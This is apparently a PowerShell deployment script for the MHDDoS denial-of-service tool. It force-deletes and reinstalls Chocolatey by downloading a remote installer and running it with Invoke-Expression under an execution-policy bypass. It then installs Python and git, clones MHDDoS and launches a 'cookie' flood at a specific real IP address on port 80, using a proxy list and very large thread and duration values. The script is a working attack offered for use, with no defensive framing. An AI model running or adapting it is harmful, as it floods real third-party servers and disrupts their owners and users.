Remove-Item C:\ProgramData\chocolatey -Recurse -Force
# Install Choco
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco install -y python3 # Install Python

choco install -y git # Install GIT

$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User") # Refresh env variables

$p = ' -p 1200'
$rpc = ' --rpc 1000'
$debug = ' --debug'

###
Set-Location '~'
Remove-Item 'MHDDoS' -Recurse -Force
git clone 'https://github.com/MatrixTM/MHDDoS.git'
Set-Location '~/MHDDoS'
python -m pip install -r 'requirements.txt'

python start.py cookie http://38.126.52.120:80  0  7250  proxy411221131.txt  2236000 2236000 true
